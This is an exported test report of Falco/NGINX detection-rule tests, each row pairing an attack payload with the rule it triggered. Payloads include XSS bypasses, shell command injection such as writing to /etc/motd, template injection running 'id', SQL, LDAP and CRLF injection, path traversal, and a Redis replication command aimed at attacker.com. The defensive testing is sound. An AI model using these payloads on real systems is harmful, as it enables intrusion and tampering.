"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_001` |
| **Name** | Nested script tag bypass |
| **Category** | XSS |
| **Subcategory** | filter_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<scr<script>ipt>alert('XSS')</script>`
- **Encoded**: `%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 15:06:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_001-1770995180862-tafus9 pattern_id=XSS_BYPASS_001 uri=/?q=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_001-1770995180862-tafus9 pattern_id=XSS_BYPASS_001 uri=/?q=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:20.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_001-1770995180862-tafus9 pattern_id=XSS_BYPASS_001 uri=/?q=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[138_XSS_BYPASS_001]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_002` |
| **Name** | AND operator with whoami |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& whoami`
- **Encoded**: `%26%26%20whoami`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 15:06:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1770995180840-9nmjzl pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1770995180840-9nmjzl pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1

**Falco Log Entry**:
```
15:06:20.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1770995180840-9nmjzl pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1
```","2","test_e2e_with_logs[306_CMD_BASIC_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_PEBBLE_001` |
| **Name** | Pebble command execution |
| **Category** | SSTI |
| **Subcategory** | pebble |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{% set cmd = ""id"" %}{{ system(cmd) }}`
- **Encoded**: `%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 15:06:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1770995213848-h6gsvf pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1770995213848-h6gsvf pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
15:06:53.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1770995213848-h6gsvf pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[547_SSTI_PEBBLE_001]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_014` |
| **Name** | SUBSTRING function test |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR SUBSTRING('test',1,1)='t' --`
- **Encoded**: `'%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 15:06:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1770995200429-evr3p pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1770995200429-evr3p pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:40.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1770995200429-evr3p pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[045_SQLI_BOOL_014]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_008` |
| **Name** | Template literal polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{alert('XSS')}`
- **Encoded**: `%7Balert%28%27XSS%27%29%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 15:06:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_POLY_008-1770995204915-9rmzw3q pattern_id=XSS_POLY_008 uri=/?q=%7Balert%28%27XSS%27%29%7D client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_POLY_008-1770995204915-9rmzw3q pattern_id=XSS_POLY_008 uri=/?q=%7Balert%28%27XSS%27%29%7D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:44.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_POLY_008-1770995204915-9rmzw3q pattern_id=XSS_POLY_008 uri=/?q=%7Balert%28%27XSS%27%29%7D client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[188_XSS_POLY_008]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_002` |
| **Name** | SVG mutation XSS |
| **Category** | XSS |
| **Subcategory** | mutation_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<svg><g/onload=alert('XSS')></g></svg>`
- **Encoded**: `%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 15:06:23.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_002-1770995183369-qkrs1k pattern_id=XSS_MUT_002 uri=/?q=%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_002-1770995183369-qkrs1k pattern_id=XSS_MUT_002 uri=/?q=%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:23.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_002-1770995183369-qkrs1k pattern_id=XSS_MUT_002 uri=/?q=%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[172_XSS_MUT_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_REDIS_003` |
| **Name** | Redis SLAVEOF Command Injection |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | redis |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `SLAVEOF attacker.com 6379`
- **Encoded**: `SLAVEOF%20attacker.com%206379`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~29000ms
- **Timestamp**: 15:07:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1770995223860-joutw8 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1770995223860-joutw8 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1

**Falco Log Entry**:
```
15:07:03.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1770995223860-joutw8 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1
```","2","test_e2e_with_logs[557_NOSQL_REDIS_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_005` |
| **Name** | System file modification via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``echo 'hacked' > /etc/motd``
- **Encoded**: `%60echo%20%27hacked%27%20%3E%20%2Fetc%2Fmotd%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 15:06:55.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_005-1770995215427-wijkos pattern_id=CMD_BACK_005 uri=/?q=%60echo%20%27hacked%27%20%3E%20%2Fetc%2Fmotd%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_005-1770995215427-wijkos pattern_id=CMD_BACK_005 uri=/?q=%60echo%20%27hacked%27%20%3E%20%2Fetc%2Fmotd%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:55.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_005-1770995215427-wijkos pattern_id=CMD_BACK_005 uri=/?q=%60echo%20%27hacked%27%20%3E%20%2Fetc%2Fmotd%60 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[300_CMD_BACK_005]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_003` |
| **Name** | Hosts file access via path traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/hosts`
- **Encoded**: `../../../etc/hosts`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 15:06:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1770995178846-2r1887 pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1770995178846-2r1887 pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1

**Falco Log Entry**:
```
15:06:18.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1770995178846-2r1887 pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1
```","1","test_e2e_with_logs[246_PATH_DOT_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_NEST_002` |
| **Name** | Nested backtick in dollar-paren |
| **Category** | CMDINJ |
| **Subcategory** | nested_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(`echo id`)`
- **Encoded**: `%24(%60echo%20id%60)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 15:06:43.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_NEST_002-1770995203897-rvav pattern_id=CMD_NEST_002 uri=/?q=%24(%60echo%20id%60) client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_NEST_002-1770995203897-rvav pattern_id=CMD_NEST_002 uri=/?q=%24(%60echo%20id%60) client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:43.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_NEST_002-1770995203897-rvav pattern_id=CMD_NEST_002 uri=/?q=%24(%60echo%20id%60) client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[344_CMD_NEST_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_ENC_003` |
| **Name** | LF-Only Injection (uppercase) |
| **Category** | CRLF |
| **Subcategory** | encoded_crlf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `LF-only uppercase line feed injection`
- **Encoded**: `%0AInjectedHeader%3Atrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~1000ms
- **Timestamp**: 15:07:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_003-1770995251856-qkpqbh pattern_id=CRLF_ENC_003 uri=/?q=%0AInjectedHeader%3Atrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_003-1770995251856-qkpqbh pattern_id=CRLF_ENC_003 uri=/?q=%0AInjectedHeader%3Atrue client=127.0.0.1

**Falco Log Entry**:
```
15:07:31.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_003-1770995251856-qkpqbh pattern_id=CRLF_ENC_003 uri=/?q=%0AInjectedHeader%3Atrue client=127.0.0.1
```","2","test_e2e_with_logs[460_CRLF_ENC_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_ATTR_001` |
| **Name** | LDAP Attribute Injection via CN |
| **Category** | LDAP |
| **Subcategory** | attribute_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `)(cn=admin`
- **Encoded**: `)(cn=admin`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 15:06:35.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Attribute injection attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_001-1770995195351-k8zhl pattern_id=LDAP_ATTR_001 uri=/?q=)(cn=admin client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_001-1770995195351-k8zhl pattern_id=LDAP_ATTR_001 uri=/?q=)(cn=admin client=127.0.0.1

**Falco Log Entry**:
```
15:06:35.000000000: Warning [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_001-1770995195351-k8zhl pattern_id=LDAP_ATTR_001 uri=/?q=)(cn=admin client=127.0.0.1
```","2","test_e2e_with_logs[381_LDAP_ATTR_001]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_059` |
| **Name** | Newline Command Injection |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `
id`
- **Encoded**: `%0Aid`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 15:06:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ADV_059-1770995209411-bzsmr pattern_id=CMD_ADV_059 uri=/?q=%0Aid client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ADV_059-1770995209411-bzsmr pattern_id=CMD_ADV_059 uri=/?q=%0Aid client=127.0.0.1

**Falco Log Entry**:
```
15:06:49.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ADV_059-1770995209411-bzsmr pattern_id=CMD_ADV_059 uri=/?q=%0Aid client=127.0.0.1
```","2","test_e2e_with_logs[287_CMD_ADV_059]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_006` |
| **Name** | Pipe character bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'||UNION||SELECT||version(),NULL,NULL--`
- **Encoded**: `'%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 15:06:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_006-1770995194915-z1p65j pattern_id=SQLI_BYPASS_006 uri=/?q='%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_006-1770995194915-z1p65j pattern_id=SQLI_BYPASS_006 uri=/?q='%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:34.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_006-1770995194915-z1p65j pattern_id=SQLI_BYPASS_006 uri=/?q='%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[055_SQLI_BYPASS_006]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BASIC_002` |
| **Name** | LDAP password bypass injection |
| **Category** | LDAP |
| **Subcategory** | basic_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `*)(|(password=*))`
- **Encoded**: `*)(|(password%3D*))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 15:06:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1770995190839-pzdfqs pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1770995190839-pzdfqs pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1

**Falco Log Entry**:
```
15:06:30.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1770995190839-pzdfqs pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1
```","2","test_e2e_with_logs[387_LDAP_BASIC_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
